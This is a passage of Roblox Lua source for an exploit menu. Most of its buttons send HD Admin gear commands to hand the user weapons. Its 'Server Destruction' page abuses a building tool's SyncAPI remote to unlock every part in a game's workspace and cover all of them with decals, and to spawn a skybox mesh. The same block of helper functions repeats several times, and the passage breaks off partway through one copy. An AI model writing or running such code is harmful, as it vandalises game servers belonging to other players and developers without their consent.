	[1] = ";gear Me 170897263 "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Lightsaber.Name = "Lightsaber"
Lightsaber.Parent = WeaponScripts
Lightsaber.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Lightsaber.BorderColor3 = Color3.fromRGB(255, 0, 0)
Lightsaber.BorderSizePixel = 3
Lightsaber.Position = UDim2.new(0, 0, 0, 132)
Lightsaber.Size = UDim2.new(0.5, 0, 0, 30)
Lightsaber.ZIndex = 2
Lightsaber.Font = Enum.Font.SourceSans
Lightsaber.Text = "Lightsaber"
Lightsaber.TextColor3 = Color3.fromRGB(255, 255, 255)
Lightsaber.TextSize = 14.000
Lightsaber.MouseButton1Down:connect(function()
local args = {
	[1] = ";gear Me 44561450 "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

AbyssalSword.Name = "Abyssal Sword"
AbyssalSword.Parent = WeaponScripts
AbyssalSword.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
AbyssalSword.BorderColor3 = Color3.fromRGB(255, 0, 0)
AbyssalSword.BorderSizePixel = 3
AbyssalSword.Position = UDim2.new(0.5, 3, 0, 132)
AbyssalSword.Size = UDim2.new(0.5, -3, 0, 30)
AbyssalSword.ZIndex = 2
AbyssalSword.Font = Enum.Font.SourceSans
AbyssalSword.Text = "Abyssal Sword"
AbyssalSword.TextColor3 = Color3.fromRGB(255, 255, 255)
AbyssalSword.TextSize = 14.000
AbyssalSword.TextWrapped = true
AbyssalSword.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 532254782 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Staff.Name = "Staff"
Staff.Parent = WeaponScripts
Staff.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Staff.BorderColor3 = Color3.fromRGB(255, 0, 0)
Staff.BorderSizePixel = 3
Staff.Position = UDim2.new(0, 0, 0, 165)
Staff.Size = UDim2.new(0.5, 0, 0, 30)
Staff.ZIndex = 2
Staff.Font = Enum.Font.SourceSans
Staff.Text = "Staff"
Staff.TextColor3 = Color3.fromRGB(255, 255, 255)
Staff.TextSize = 14.000
Staff.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 26421972 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

TechnoGauntlet.Name = "Techno Gauntlet"
TechnoGauntlet.Parent = WeaponScripts
TechnoGauntlet.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TechnoGauntlet.BorderColor3 = Color3.fromRGB(255, 0, 0)
TechnoGauntlet.BorderSizePixel = 3
TechnoGauntlet.Position = UDim2.new(0.5, 3, 0, 165)
TechnoGauntlet.Size = UDim2.new(0.5, -3, 0, 30)
TechnoGauntlet.ZIndex = 2
TechnoGauntlet.Font = Enum.Font.SourceSans
TechnoGauntlet.Text = "Techno Gauntlet"
TechnoGauntlet.TextColor3 = Color3.fromRGB(255, 255, 255)
TechnoGauntlet.TextSize = 14.000
TechnoGauntlet.TextWrapped = true
TechnoGauntlet.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 243790334 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Plane.Name = "Plane"
Plane.Parent = WeaponScripts
Plane.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Plane.BorderColor3 = Color3.fromRGB(255, 0, 0)
Plane.BorderSizePixel = 3
Plane.Position = UDim2.new(0, 0, 0, 198)
Plane.Size = UDim2.new(0.5, 0, 0, 30)
Plane.ZIndex = 2
Plane.Font = Enum.Font.SourceSans
Plane.Text = "Plane"
Plane.TextColor3 = Color3.fromRGB(255, 255, 255)
Plane.TextSize = 14.000
Plane.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 163348575 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Snowball.Name = "Snowball"
Snowball.Parent = WeaponScripts
Snowball.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Snowball.BorderColor3 = Color3.fromRGB(255, 0, 0)
Snowball.BorderSizePixel = 3
Snowball.Position = UDim2.new(0.5, 3, 0, 198)
Snowball.Size = UDim2.new(0.5, -3, 0, 30)
Snowball.ZIndex = 2
Snowball.Font = Enum.Font.SourceSans
Snowball.Text = "Snowball"
Snowball.TextColor3 = Color3.fromRGB(255, 255, 255)
Snowball.TextSize = 14.000
Snowball.TextWrapped = true
Snowball.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 19328185 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

SuicideVest.Name = "Suicide Vest"
SuicideVest.Parent = WeaponScripts
SuicideVest.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
SuicideVest.BorderColor3 = Color3.fromRGB(255, 0, 0)
SuicideVest.BorderSizePixel = 3
SuicideVest.Position = UDim2.new(0, 0, 0, 231)
SuicideVest.Size = UDim2.new(0.5, 0, 0, 30)
SuicideVest.ZIndex = 2
SuicideVest.Font = Enum.Font.SourceSans
SuicideVest.Text = "Bomb"
SuicideVest.TextColor3 = Color3.fromRGB(255, 255, 255)
SuicideVest.TextSize = 14.000
SuicideVest.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 11563251 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

DualBlades.Name = "Dual Blades"
DualBlades.Parent = WeaponScripts
DualBlades.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
DualBlades.BorderColor3 = Color3.fromRGB(255, 0, 0)
DualBlades.BorderSizePixel = 3
DualBlades.Position = UDim2.new(0.5, 3, 0, 66)
DualBlades.Size = UDim2.new(0.5, -3, 0, 30)
DualBlades.ZIndex = 2
DualBlades.Font = Enum.Font.SourceSans
DualBlades.Text = "Dual Blades"
DualBlades.TextColor3 = Color3.fromRGB(255, 255, 255)
DualBlades.TextSize = 14.000
DualBlades.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 158069180 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Titan.Name = "Titan"
Titan.Parent = WeaponScripts
Titan.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Titan.BorderColor3 = Color3.fromRGB(255, 0, 0)
Titan.BorderSizePixel = 3
Titan.Position = UDim2.new(0.5, 3, 0, 231)
Titan.Size = UDim2.new(0.513333321, -3, 0, 30)
Titan.ZIndex = 2
Titan.Font = Enum.Font.SourceSans
Titan.Text = "Battle Titan"
Titan.TextColor3 = Color3.fromRGB(255, 255, 255)
Titan.TextSize = 14.000
Titan.TextWrapped = true
Titan.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 1304344132 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Hammer.Name = "Hammer"
Hammer.Parent = WeaponScripts
Hammer.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Hammer.BorderColor3 = Color3.fromRGB(255, 0, 0)
Hammer.BorderSizePixel = 3
Hammer.Position = UDim2.new(-0.0199999996, 3, 0.0840000138, 231)
Hammer.Size = UDim2.new(0.519999981, -3, 0, 30)
Hammer.ZIndex = 2
Hammer.Font = Enum.Font.SourceSans
Hammer.Text = "Hammer"
Hammer.TextColor3 = Color3.fromRGB(255, 255, 255)
Hammer.TextSize = 14.000
Hammer.TextWrapped = true
Hammer.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 45177979 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

GearTools.Name = "Gear/Tools"
GearTools.Parent = Page2_2
GearTools.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
GearTools.BorderColor3 = Color3.fromRGB(255, 0, 0)
GearTools.BorderSizePixel = 3
GearTools.Position = UDim2.new(0.5, 3, 0, 0)
GearTools.Size = UDim2.new(0.5, -3, 1, 0)
GearTools.ZIndex = 2

CustomGear.Name = "Custom Gear"
CustomGear.Parent = GearTools
CustomGear.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
CustomGear.BorderColor3 = Color3.fromRGB(255, 0, 0)
CustomGear.BorderSizePixel = 3
CustomGear.Position = UDim2.new(0, 0, 0, 33)
CustomGear.Size = UDim2.new(0.5, 0, 0, 30)
CustomGear.ZIndex = 2
CustomGear.Font = Enum.Font.SourceSans
CustomGear.Text = "Sword"
CustomGear.TextColor3 = Color3.fromRGB(255, 255, 255)
CustomGear.TextSize = 14.000
CustomGear.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me ;sword me "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Title_12.Name = "Title"
Title_12.Parent = GearTools
Title_12.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_12.BorderSizePixel = 3
Title_12.Size = UDim2.new(1, 0, 0, 30)
Title_12.ZIndex = 2
Title_12.Font = Enum.Font.SourceSansBold
Title_12.Text = "Gear/Tools (Need HD ADMIN)"
Title_12.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_12.TextSize = 14.000
Title_12.TextWrapped = true

StamperTools.Name = "Stamper Tools"
StamperTools.Parent = GearTools
StamperTools.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
StamperTools.BorderColor3 = Color3.fromRGB(255, 0, 0)
StamperTools.BorderSizePixel = 3
StamperTools.Position = UDim2.new(0.5, 3, 0, 33)
StamperTools.Size = UDim2.new(0.5, -3, 0, 30)
StamperTools.ZIndex = 2
StamperTools.Font = Enum.Font.SourceSans
StamperTools.Text = "Pirate Hook"
StamperTools.TextColor3 = Color3.fromRGB(255, 255, 255)
StamperTools.TextSize = 14.000
StamperTools.TextWrapped = true
StamperTools.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 14131602 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

ToolStealer.Name = "Tool Stealer"
ToolStealer.Parent = GearTools
ToolStealer.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
ToolStealer.BorderColor3 = Color3.fromRGB(255, 0, 0)
ToolStealer.BorderSizePixel = 3
ToolStealer.Position = UDim2.new(0, 0, 0, 66)
ToolStealer.Size = UDim2.new(0.5, 0, 0, 30)
ToolStealer.ZIndex = 2
ToolStealer.Font = Enum.Font.SourceSans
ToolStealer.Text = "Gun"
ToolStealer.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolStealer.TextSize = 14.000
ToolStealer.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 97885508 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

InsertTool.Name = "Insert Tool"
InsertTool.Parent = GearTools
InsertTool.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
InsertTool.BorderColor3 = Color3.fromRGB(255, 0, 0)
InsertTool.BorderSizePixel = 3
InsertTool.Position = UDim2.new(0.5, 3, 0, 66)
InsertTool.Size = UDim2.new(0.5, -3, 0, 30)
InsertTool.ZIndex = 2
InsertTool.Font = Enum.Font.SourceSans
InsertTool.Text = "Cool Sword"
InsertTool.TextColor3 = Color3.fromRGB(255, 255, 255)
InsertTool.TextSize = 14.000
InsertTool.TextWrapped = true
InsertTool.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 10469910 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Empty.Name = "Empty"
Empty.Parent = GearTools
Empty.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Empty.BorderColor3 = Color3.fromRGB(255, 0, 0)
Empty.BorderSizePixel = 3
Empty.Position = UDim2.new(0, 0, 0, 99)
Empty.Size = UDim2.new(0.5, 0, 0, 30)
Empty.ZIndex = 2
Empty.Font = Enum.Font.SourceSans
Empty.Text = "Empty"
Empty.TextColor3 = Color3.fromRGB(255, 255, 255)
Empty.TextSize = 14.000
Empty.TextWrapped = true

Gun.Name = "Gun"
Gun.Parent = GearTools
Gun.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Gun.BorderColor3 = Color3.fromRGB(255, 0, 0)
Gun.BorderSizePixel = 3
Gun.Position = UDim2.new(0.5, 3, 0, 99)
Gun.Size = UDim2.new(0.5, -3, 0, 30)
Gun.ZIndex = 2
Gun.Font = Enum.Font.SourceSans
Gun.Text = "Btools"
Gun.TextColor3 = Color3.fromRGB(255, 255, 255)
Gun.TextSize = 14.000
Gun.TextWrapped = true
Gun.MouseButton1Down:connect(function()
	local args = {
		[1] = ";give me b"
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

DrawTool.Name = "Draw Tool"
DrawTool.Parent = GearTools
DrawTool.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
DrawTool.BorderColor3 = Color3.fromRGB(255, 0, 0)
DrawTool.BorderSizePixel = 3
DrawTool.Position = UDim2.new(0, 0, 0, 132)
DrawTool.Size = UDim2.new(0.5, 0, 0, 30)
DrawTool.ZIndex = 2
DrawTool.Font = Enum.Font.SourceSans
DrawTool.Text = "Subspace Tripmine"
DrawTool.TextColor3 = Color3.fromRGB(255, 255, 255)
DrawTool.TextSize = 14.000
DrawTool.TextWrapped = true
DrawTool.MouseButton1Down:connect(function()
	local args = {
		[1] = ";gear Me 11999247 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

PageLabel_3.Name = "PageLabel"
PageLabel_3.Parent = Page2_2
PageLabel_3.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_3.BorderSizePixel = 3
PageLabel_3.Position = UDim2.new(0, 0, 1, -30)
PageLabel_3.Size = UDim2.new(1, 0, 0, 30)
PageLabel_3.ZIndex = 2
PageLabel_3.Font = Enum.Font.SourceSans
PageLabel_3.Text = "Page 2"
PageLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_3.TextSize = 18.000
PageLabel_3.TextWrapped = true

Page1_2.Name = "Page1"
Page1_2.Parent = Frame
Page1_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Page1_2.BorderColor3 = Color3.fromRGB(255, 0, 4)
Page1_2.BorderSizePixel = 3
Page1_2.Position = UDim2.new(0, 0, 0, 83)
Page1_2.Size = UDim2.new(1, 0, 1, -106)
Page1_2.ZIndex = 2

ServerDestruction.Name = "Server Destruction"
ServerDestruction.Parent = Page1_2
ServerDestruction.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
ServerDestruction.BorderColor3 = Color3.fromRGB(255, 0, 0)
ServerDestruction.BorderSizePixel = 3
ServerDestruction.Size = UDim2.new(0.5, 0, 1, 0)
ServerDestruction.ZIndex = 2

TextButton_7.Parent = ServerDestruction
TextButton_7.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_7.BorderSizePixel = 3
TextButton_7.Position = UDim2.new(0, 0, 0, 33)
TextButton_7.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_7.ZIndex = 2
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "Team Fatify"
TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.TextSize = 14.000
TextButton_7.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("13579585726")



	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("13579585726")
end)

Title_13.Name = "Title"
Title_13.Parent = ServerDestruction
Title_13.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_13.BorderSizePixel = 3
Title_13.Size = UDim2.new(1, 0, 0, 30)
Title_13.ZIndex = 2
Title_13.Font = Enum.Font.SourceSansBold
Title_13.Text = "Server Destruction"
Title_13.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_13.TextSize = 14.000
Title_13.TextWrapped = true

TextButton_8.Parent = ServerDestruction
TextButton_8.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_8.BorderSizePixel = 3
TextButton_8.Position = UDim2.new(0, 0, 0, 66)
TextButton_8.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_8.ZIndex = 2
TextButton_8.Font = Enum.Font.SourceSans
TextButton_8.Text = "Full Destruction"
TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true
TextButton_8.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

